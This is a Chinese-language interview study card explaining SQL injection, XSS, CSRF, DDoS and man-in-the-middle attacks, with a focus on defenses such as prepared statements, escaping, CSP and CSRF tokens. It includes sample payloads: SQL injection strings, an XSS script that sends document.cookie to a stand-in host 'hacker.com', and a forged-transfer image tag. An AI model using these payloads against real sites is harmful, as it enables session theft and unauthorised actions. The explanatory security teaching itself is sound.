---
title: 12. SQL 注入与常见网络攻击
aliases: d3e4f5a6-b7c8-9d0e-1f2a-3b4c5d6e7f8a
date: 2026-03-04 16:45:06
tags: [interview, security, sql-injection, xss, csrf]
card: true
order: 12
---

## 问题分析

面试官询问网络安全问题，旨在考察你是否具备基本的安全意识和防御能力。这是后端开发者的红线，如果你连 SQL 注入都不知道怎么防，很可能写出高危代码。回答时，不仅要解释攻击原理，更要重点阐述**防御方案**（How to fix），因为这才是工程实践中最有价值的部分。

## 核心解答

### 口语回答

“网络安全是 Web 开发中非常重要的一环。

首先是 **SQL 注入**，它的核心原理是**将用户输入的数据当做代码执行**。攻击者通过构造特殊的 SQL 语句（比如 `' OR 1=1 --`），绕过认证或窃取数据。防御的最有效手段是使用**预编译语句 (Prepared Statements)** 或 ORM，坚决避免直接拼接 SQL 字符串。

除了 SQL 注入，常见的网络攻击还有：
1.  **XSS (跨站脚本攻击)**：攻击者在网页中注入恶意脚本（如 JavaScript），当其他用户浏览时脚本执行，从而窃取 Cookie 或 Session。防御方法是对用户输入进行严格的**转义 (Escape)** 和过滤。
2.  **CSRF (跨站请求伪造)**：攻击者诱导用户在已登录状态下访问恶意链接，利用用户的身份凭证（Cookie）在后台执行敏感操作（如转账）。防御的核心是使用 **CSRF Token**，确保请求是用户自愿发起的。
3.  **DDoS (分布式拒绝服务)**：通过大量僵尸网络流量淹没服务器，导致服务不可用。防御通常依赖高防 IP、CDN 清洗流量或限流策略。”

### 核心结论 (Key Takeaways)

| 攻击类型 | 英文全称 | 核心原理 | 核心防御 |
| :--- | :--- | :--- | :--- |
| **SQL 注入** | SQL Injection | 数据被误当成 SQL 代码执行 | **预编译 (Prepared Statements)**、ORM |
| **XSS** | Cross-Site Scripting | 恶意脚本注入页面并在浏览器执行 | **输入过滤、输出转义**、CSP |
| **CSRF** | Cross-Site Request Forgery | 利用用户身份（Cookie）伪造请求 | **CSRF Token**、检查 Referer |
| **DDoS** | Distributed Denial of Service | 流量洪峰耗尽服务器资源 | **CDN**、流量清洗、限流 (Rate Limiting) |

## 详细解析

### 1. SQL 注入 (SQL Injection)

**原理**: 应用程序未对用户输入进行过滤，直接将其拼接到 SQL 语句中执行。

**攻击示例**:
假设登录验证 SQL 为：
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```
如果用户输入 `username` 为 `admin' --`，SQL 变为：
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...';
```
`--` 是注释符，后面的密码验证被忽略，攻击者直接以 admin 身份登录。

**防御 (Go 示例)**:
使用 `database/sql` 的参数化查询（预编译）：
```go
// 错误：字符串拼接
// query := fmt.Sprintf("SELECT * FROM users WHERE id = %s", id)

// 正确：参数化查询 (?)
row := db.QueryRow("SELECT * FROM users WHERE id = ?", id)
```

### 2. XSS (跨站脚本攻击)

**原理**: 攻击者将恶意 HTML/JS 代码注入到网页中。分为**存储型**（存入数据库，如论坛发帖）、**反射型**（通过 URL 参数）和 **DOM 型**。

**攻击示例**:
攻击者在评论区发布内容：`<script>fetch('http://hacker.com?cookie='+document.cookie)</script>`。
当其他用户查看该评论时，脚本自动执行，Cookie 被发送给攻击者。

**防御**:
*   **HTML 转义**: 将 `<` 转义为 `&lt;`，`>` 转义为 `&gt;`。Go 的 `html/template` 包默认会自动转义。
*   **CSP (Content Security Policy)**: 设置 HTTP 头，限制浏览器只加载可信域名的脚本。

### 3. CSRF (跨站请求伪造)

**原理**: 攻击者利用受害者在已登录网站的身份凭证（Cookie），诱导受害者访问恶意链接，向服务器发送伪造请求。

**攻击示例**:
1.  用户登录了银行网站 `bank.com`。
2.  攻击者诱导用户访问 `hacker.com`。
3.  `hacker.com` 页面中有一个隐藏的图片或表单：
    ```html
    <img src="http://bank.com/transfer?to=hacker&amount=1000">
    ```
4.  浏览器会自动携带 `bank.com` 的 Cookie 发送请求，银行服务器误以为是用户本人操作。

**防御**:
*   **CSRF Token**: 在表单中加入一个随机生成的 Token，服务器验证 Token 是否匹配。由于攻击者无法读取用户的页面内容（受同源策略限制），无法获取 Token。
*   **SameSite Cookie**: 设置 Cookie 的 `SameSite` 属性为 `Strict` 或 `Lax`。

### 4. DDoS (分布式拒绝服务)

**原理**: 利用大量受控的“肉鸡”（僵尸网络）向目标服务器发送海量请求（如 SYN Flood, UDP Flood, HTTP Flood），耗尽服务器带宽或 CPU/内存资源。

**防御**:
*   **硬件防火墙**: 识别并清洗异常流量。
*   **CDN**: 利用边缘节点分担流量。
*   **限流 (Rate Limiting)**: 限制单个 IP 的请求频率（如 Nginx 的 `limit_req`）。

## 扩展：中间人攻击 (MITM)

**原理**: 攻击者拦截并篡改客户端与服务器之间的通信。
**防御**: 全站 **HTTPS**。HTTPS 通过 SSL/TLS 证书验证服务器身份，并对传输数据加密，防止被监听和篡改。
